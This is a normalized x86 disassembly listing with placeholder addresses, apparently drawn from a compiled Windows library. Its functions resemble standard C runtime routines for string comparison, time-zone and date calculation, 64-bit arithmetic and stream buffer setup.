je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10016180
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10016208
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_1000c185
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ edi ] ebx
jne r-xdata
cmp esi ebx
jne r-xdata
push edi
push [ ebp + 0xc ]
push esi
call sub_1001a6f2
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
mov esi [ edi ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
cmp [ eax ] bl
je r-xdata
jmp r-xdata
cmp [ edi ] bl
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ edi ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov al [ edi ]
cmp al [ esi ]
je r-xdata
lea eax [ edi + 0x1 ]
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp [ esi ] bl
jne r-xdata
inc esi
inc esi
cmp [ esi ] bl
je r-xdata
inc edi
cmp [ edi ] bl
jne r-xdata
inc edi
call sub_1001034f
mov [ eax ] 0x2a
mov dl [ edi ]
cmp dl [ esi ]
jne r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
mov [ ebp - 0x4 ] ebx
cmp [ eax ] bl
je r-xdata
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x2a
jmp r-xdata
mov edi eax
jmp r-xdata
cmp cl [ esi + 0x1 ]
je r-xdata
cmp [ edi ] bl
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ edi ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
cmp [ ebp - 0x8 ] esi
jne r-xdata
mov [ esi ] bl
inc esi
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov al [ edi ]
cmp al [ esi ]
je r-xdata
lea eax [ edi + 0x1 ]
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov [ esi ] bl
inc esi
jmp r-xdata
inc esi
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
inc edi
cmp [ edi ] bl
jne r-xdata
inc edi
jmp r-xdata
mov dl [ edi ]
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ esi ] bl
mov esi eax
jmp r-xdata
mov edi eax
jmp r-xdata
cmp cl [ esi + 0x1 ]
je r-xdata
mov [ ebp - 0x4 ] 0x1
sub_1001640a
push 0x2c
push r--data
call sub_10011e54
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_10016eaf
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10016e64
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10016df2
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_10016e2b
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
call sub_10018172
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_1001a7e0
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_10014870
inc eax
push eax
call sub_10015982
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_10016180
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10011e99
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_10018256
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_10014870
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_1001830b
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_100163f9
push [ ebp - 0x24 ]
call sub_100163d7
push [ ebp - 0x28 ]
call sub_100163e8
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100166b6
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
jmp r-xdata
push eax
call sub_1000c3e9
pop ecx
push esi
call sub_1000d698
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_1000d698
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_10018256
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_10016ea9
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_10016e9d
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_1000d698
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_10016750
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_10016e2b
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100101bf
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_10016947
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_10016df2
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100101bf
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_10016750
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_10016750
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_10016750
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_10016750
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_10016b1f
push 0x8
push r--data
call sub_10011e54
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_10011e99
retn
push 0x6
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016b65
call sub_1001640a
inc [ rw-data ]
sub_10016b6e
push 0xc
push r--data
call sub_10011e54
push 0x6
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_10016947
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016ba6
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
sub_10016baf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_1000ebe0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_1001034f
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_100102e7
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_10016ec0
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_1001a2b0
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_1001a2b0
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_10016ec0
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_1001a2b0
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_10016ec0
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_10016ec0
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_1001a2b0
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_10016ec0
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_10016df2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10016e2b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10016e64
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10016ec0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10016f70
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10017022
mov edi edi
push esi
call sub_1000fcde
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
call sub_1001034f
mov [ eax ] 0xc
xor eax eax
pop esi
retn
mov eax [ esi + 0x44 ]
pop esi
retn
push 0x24
call sub_10015982
pop ecx
mov [ esi + 0x44 ] eax
test eax eax
je r-xdata
sub_10017059
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10012f31
push eax
call sub_100186aa
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_1001203c
add eax 0x20
cmp esi eax
jne r-xdata
call sub_1001203c
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_10015982
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_100170f5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_1000d08e
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_10017129
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_1000fb0b
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_1000fb0b
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_1001a867
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_1000fa90
mov [ esi ] eax
add esi 0x4
push esi
call sub_1000fa90
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10015a13
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10015a13
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_1000fa90
pop ecx
mov [ rw-data ] eax
sub_100171e5
push esi
push 0x4
push 0x20
call sub_100159c7
mov esi eax
push esi
call sub_1000fa90
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10017214
push 0xc
push r--data
call sub_10011e54
call sub_1000e70b
and [ ebp - 0x4 ] 0x0
